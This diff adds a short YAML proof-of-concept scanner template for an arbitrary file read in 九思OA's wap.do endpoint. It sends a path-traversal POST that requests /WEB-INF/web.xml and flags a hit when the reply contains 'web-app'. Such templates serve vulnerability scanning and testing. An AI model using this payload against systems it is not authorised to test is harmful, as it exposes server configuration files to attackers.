@@ -1,0 +1,13 @@
+name: poc-yaml-九思OA-wap.do-任意文件读取
+description: "任意文件读取"
+method: POST
+headers:
+  Content-Type: "application/x-www-form-urlencoded"
+path:
+  - /jsoa/wap.do?method=downLoad
+body: >
+  path=../&name=&FileName=/WEB-INF/web.xml
+expression:
+  status: 200
+  body_any:
+    body_all: ["web-app"]
